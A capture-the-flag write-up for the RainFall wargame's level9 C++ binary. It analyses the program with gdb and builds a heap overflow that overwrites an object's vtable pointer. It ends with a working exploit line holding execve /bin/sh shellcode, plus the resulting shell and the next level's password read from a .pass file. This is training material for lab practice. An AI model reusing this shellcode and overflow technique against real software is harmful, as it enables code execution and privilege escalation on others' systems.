1. The fact that it is c++ code qith class and object makes it a bit tricky.

2. `i functions`

```
(gdb) i functions
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
```

3. Program and state of the stack before calling setAnnotation:

- Basically, the 2 calls to `<_Znwj@plt>` (<+35> & <+69>)are calls to new, with an allocation size of **0x6c** (will be passed to malloc in constructor).
- Check in the above code (`i functions`), the function address is the one for `operator new(unisgned int)`
- They each allow for the creation, ON THE HEAP, of a new N object
- Then we have also 2 calls to `0x80486f6 <_ZN1NC2Ei>` which is the memory address of the N constructor (check above), with first **0x5** and the **0x6** as parameters.
- So we have two pointers to two N objects. We'll call them **n** and **m**.

lines <+58> and <+92>, we can see that n is stored at `$esp+0x1c` and m at `$esp+0x18` :

```
(gdb) x/10wx $esp
0xbffff6b0:	0x0804a008	0xbffff8c4	0xbffff780	0xb7d79e55
0xbffff6c0:	0x0804a078	0x0804a008	0x0804a078	0x0804a008
0xbffff6d0:	0x08048770	0xb7eebff4
```

so n points to memory location **0x0804a008** and m to **0x0804a078**

4. The call to setAnnotation

- Then the `setAnnotation` member function is called on the n object, with argument `argv[1]`.
- How do we know it's on n? because if we break right before the call to setAnnotation and check the stack we have :

```
(gdb) x/2wx $esp
0xbffff6b0:	0x0804a008	0xbffff8c4
(gdb) x/s 0xbffff8c4
0xbffff8c4:	 "coucou"
```

We can see that the first argument is n, and the second argument is our argv[1] (whici here as a test we set as "coucou").

- The setAnnotation function call `strlen` on its string argument (**ebp+0xc** in setAnnotation is **esp+0x4** in main, as eip and ebp are pushed onto the stack in between).
- Then it gets a pointer `ptr = value of ptr + 0x4 = 0x0804a008 + 0x4 = 0x0804a00c`
- And copies at this address the content of the string (argv[1]).


5. After setAllocation, in the main, the program calls the + operator function of m on n.
- It has to dereference m two times (lines <140> and <142>) to get to the first method which is the + operator.
- It stores the function in **edx** and calls it.

6. Our exploit:

We should use the **memcpy** in `setAnnotation` to make the call to `edx` calls a shellcode.

- So our memory where the content of argv[1] will be copied is : **0x0804a00c**
- the m pointers points to the memory location : **0x0804a078**
- => so **0x6c** or **108** bytes ahead of our pointer!

But m is dereferenced two times. So at this position we will have to write an address, which will points to another address in the buffer, which will again points to our shellcode!

- THe shellcode is 45 bytes long. The address that will point to it is 4 bytes long.
- `108 - 45 - 4 = 59 bytes` => 59 bytes of random code (we'll use the NOP opcode). Then we will erase m value with the value of the beginning of our buffer : **0x0804a00c**
- The first address will point to somewhere randomly in the NOP suite of instructions in the buffer. As the buffer starts at **0x0804a00c**, **0x0804a01c**, whici is 16 bytes ahead, is a good candidate!

Here is the exploit:

```
level9@RainFall:~$ ./level9 $(python -c 'print("\x1c\xa0\x04\x08" + "\x90" * 59 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x0c\xa0\x04\x08")')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

